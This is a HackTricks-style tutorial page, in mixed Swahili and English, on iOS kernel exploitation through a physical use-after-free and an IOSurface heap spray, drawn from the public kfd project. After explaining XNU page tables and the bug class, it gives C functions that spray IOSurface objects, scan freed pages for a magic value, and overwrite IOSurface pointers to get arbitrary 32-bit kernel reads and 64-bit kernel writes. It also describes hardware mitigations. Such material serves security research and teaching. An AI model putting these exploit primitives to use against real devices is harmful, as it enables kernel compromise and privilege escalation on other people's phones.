# iOS Physical Use-After-Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

Hii ni muhtasari kutoka kwenye post ya [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html). Taarifa zaidi kuhusu exploit inayotumia teknik hii inaweza kupatikana kwenye [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

The **virtual memory address space** kwa michakato ya user kwenye iOS inajulikana kuanzia **0x0 hadi 0x8000000000**. Hata hivyo, anwani hizi hazitafsiri moja kwa moja kuwa physical memory. Badala yake, the **kernel** inatumia **page tables** kutafsiri anwani za virtual kuwa **physical addresses** halisi.

#### Levels of Page Tables in iOS

Page tables zimepangwa kwa hatua tatu:

1. **L1 Page Table (Level 1)**:
* Kila entry hapa inawakilisha eneo kubwa la virtual memory.
* Inafunika **0x1000000000 bytes** (au **256 GB**) ya virtual memory.
2. **L2 Page Table (Level 2)**:
* Entry hapa inawakilisha eneo ndogo zaidi la virtual memory, hasa **0x2000000 bytes** (32 MB).
* Entry ya L1 inaweza kuelekeza kwenye L2 table ikiwa haiwezi kuoanisha eneo lote yenyewe.
3. **L3 Page Table (Level 3)**:
* Hii ni level ya kina zaidi, ambapo kila entry inaoanisha ukurasa mmoja wa **4 KB**.
* Entry ya L2 inaweza kuelekeza kwenye L3 table ikiwa inahitaji udhibiti wa kina zaidi.

#### Mapping Virtual to Physical Memory

* **Direct Mapping (Block Mapping)**:
* Baadhi ya entry kwenye page table zinaoanisha moja kwa moja **msururu wa anwani za virtual** kwa msururu wa contiguous wa anwani za physical (kama njia mkato).
* **Pointer to Child Page Table**:
* Ikiwa inahitajika udhibiti wa kina, entry katika level moja (mfano L1) inaweza kuelekeza kwenye **child page table** kwenye level inayofuata (mfano L2).

#### Example: Mapping a Virtual Address

Tuseme unajaribu kufikia anwani ya virtual **0x1000000000**:

1. **L1 Table**:
* Kernel inakagua entry ya L1 inayohusiana na anwani hii ya virtual. Ikiwa ina **pointer to an L2 page table**, inahamia L2 table hiyo.
2. **L2 Table**:
* Kernel inakagua L2 page table kwa mapping ya kina zaidi. Ikiwa entry hii inaelekeza kwenye **L3 page table**, inaendelea huko.
3. **L3 Table**:
* Kernel inatafuta entry ya mwisho ya L3, ambayo inaelekeza kwenye **physical address** ya ukurasa wa kumbukumbu.

#### Example of Address Mapping

Ikiwa unaandika physical address **0x800004000** kwenye index ya kwanza ya L2 table, basi:

* Anwani za virtual kutoka **0x1000000000** hadi **0x1002000000** zinaoanisha kwa anwani za physical kutoka **0x800004000** hadi **0x802004000**.
* Hii ni **block mapping** kwenye level ya L2.

Akiba, ikiwa entry ya L2 inaelekeza kwenye L3 table:

* Kila ukurasa wa 4 KB kwenye anwani ya virtual **0x1000000000 -> 0x1002000000** utatafsiriwa na entry za kibinafsi katika L3 table.

### Physical use-after-free

Physical **use-after-free** (UAF) hutokea wakati:

1. Mchakato unafanya **allocate** memory fulani kama **readable na writable**.
2. **page tables** zinasasishwa ili kuoanisha memory hii na physical address maalum ambayo mchakato unaweza kufikia.
3. Mchakato una **deallocate** (free) memory hiyo.
4. Hata hivyo, kutokana na **bug**, kernel **inasahau kuondoa mapping** kutoka kwenye page tables, ingawa inaweka physical memory husika kama free.
5. Kernel inaweza kisha **kureallocate memory hii "freed"** kwa matumizi mengine, kama data ya kernel.
6. Kwa kuwa mapping haikuondolewa, mchakato bado anaweza **kusoma na kuandika** kwenye memory hiyo ya physical.

Hii inamaanisha mchakato unaweza kufikia **pages za kernel memory**, ambazo zinaweza kubeba data nyeti au miundo, na hivyo kumruhusu mwizi **kuathiri kernel memory**.

### IOSurface Heap Spray

Kwa kuwa mshambuliaji hana udhibiti wa kurudia ni kurasa gani za kernel zitapatiwa memory iliyofutwa, wanatumia tekniki inayoitwa **heap spray**:

1. Mshambuliaji **anaunda idadi kubwa ya IOSurface objects** katika kernel memory.
2. Kila IOSurface object ina **magic value** katika moja ya fields zake, kufanya iwe rahisi kuibua.
3. Wanapitia **pages zilizofutwa** kuona kama IOSurface objects yoyote imeangukia kwenye ukurasa uliotolewa.
4. Wao wanapogundua IOSurface object kwenye ukurasa uliofutwa, wanaweza kutumia ili **kusoma na kuandika kernel memory**.

Taarifa zaidi kuhusu hili ziko kwenye [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Tambua kwamba vifaa vya iOS 16+ (A12+) vinamitigation za hardware (kama PPL au SPTM) zinazofanya physical UAF techniques kuwa ngumu zaidi. PPL inatekeleza ulinzi mgumu wa MMU kwenye kurasa zinazohusiana na code signing, entitlements, na data nyeti ya kernel, hivyo, hata ikiwa ukurasa utatumika tena, maandishi kutoka userland au code ya kernel iliyomilikiwa yanazuia kuandika kwenye kurasa zilizolindwa na PPL. Secure Page Table Monitor (SPTM) inaongeza PPL kwa kuimarisha sasisho za page table wenyewe. Inahakikisha kwamba hata code yenye mamlaka ya kernel haiwezi kubadilisha silently mappings au kupindua freed pages bila kupitia ukaguzi salama. KTRR (Kernel Text Read-Only Region), ambayo inalaza eneo la code ya kernel kama read-only baada ya boot. Hii inazuia mabadiliko ya runtime kwa code ya kernel, ikifunga njia kubwa ya shambulio ambayo physical UAF exploits mara nyingi hutegemea. Zaidi ya hayo, allocations za `IOSurface` zimekuwa zisizotarajiwa na ngumu zaidi kupangwa ndani ya maeneo yanayoweza kufikiwa na user, jambo linalofanya mbinu ya “magic value scanning” kuwa isiyokuwa na uhakika. Na `IOSurface` sasa inalindwa na entitlements na vizuizi vya sandbox.

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: mshambuliaji anaunda IOSurface objects nyingi zilizo na kitambulisho maalum ("magic value").
2. **Scan Freed Pages**: wanakagua ikiwa yoyote ya objects imewekwa kwenye ukurasa uliotolewa.
3. **Read/Write Kernel Memory**: kwa kuathiri fields ndani ya IOSurface object, wanapata uwezo wa kufanya **arbitrary reads and writes** katika kernel memory. Hii inawawezesha:
* Kutumia field moja kusoma **kiasi chochote cha 32-bit** katika kernel memory.
* Kutumia field nyingine kuandika **64-bit values**, wakifikia primitive imara ya **kernel read/write**.

Generate IOSurface objects with the magic value IOSURFACE_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Tafuta vitu vya **`IOSurface`** katika ukurasa mmoja wa kimwili uliotolewa:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Kupata kusoma/kuandika kwa kernel kwa kutumia IOSurface

Baada ya kupata udhibiti wa objekti ya IOSurface katika kernel memory (imepangwa kwenye ukurasa wa kimwili uliotolewa unaopatikana kutoka userspace), tunaweza kuitumia kwa **operesheni zozote za kusoma na kuandika katika kernel**.

**Minda Muhimu katika IOSurface**

Objekti ya IOSurface ina vipengele viwili muhimu:

1. **Use Count Pointer**: Inaruhusu **kusoma kwa 32-bit**.
2. **Indexed Timestamp Pointer**: Inaruhusu **kuandika kwa 64-bit**.

Kwa kuandika upya pointers hizi, tunaziweka kuonyesha anwani zozote katika kernel memory, hivyo kuwezesha uwezo wa kusoma/kuandika.

#### Kusoma kwa 32-bit kwa kernel

Ili kufanya kusoma:

1. Bandika upya **use count pointer** ili ianze kuonyesha anwani lengwa ukiokoa offset ya 0x14-byte.
2. Tumia method `get_use_count` kusoma thamani kwenye anwani hiyo.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel Write

Ili kufanya uandishi:

1. Andika tena **indexed timestamp pointer** kwa anwani lengwa.
2. Tumia method ya `set_indexed_timestamp` kuandika thamani ya 64-bit.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Exploit Flow Recap

1. **Sababisha Physical Use-After-Free**: Kurasa zilizotolewa zinaweza kutumika tena.
2. **Spray IOSurface Objects**: Tenga vitu vingi vya IOSurface na "magic value" ya kipekee katika kernel memory.
3. **Identify Accessible IOSurface**: Tafuta IOSurface kwenye ukurasa uliotolewa unaodhibiti.
4. **Abuse Use-After-Free**: Badilisha pointers katika object ya IOSurface ili kuwezesha arbitrary **kernel read/write** kupitia IOSurface methods.

Kwa kutumia primitives hizi, the exploit hutoa controlled **32-bit reads** na **64-bit writes** kwa kernel memory. Hatua za ziada za jailbreak zinaweza kuhusisha primitives za read/write zenye utulivu zaidi, ambazo zinaweza kuhitaji kupitisha ulinzi wa ziada (mfano, PPL kwenye vifaa vipya vya arm64e).

{{#include ../../banners/hacktricks-training.md}}
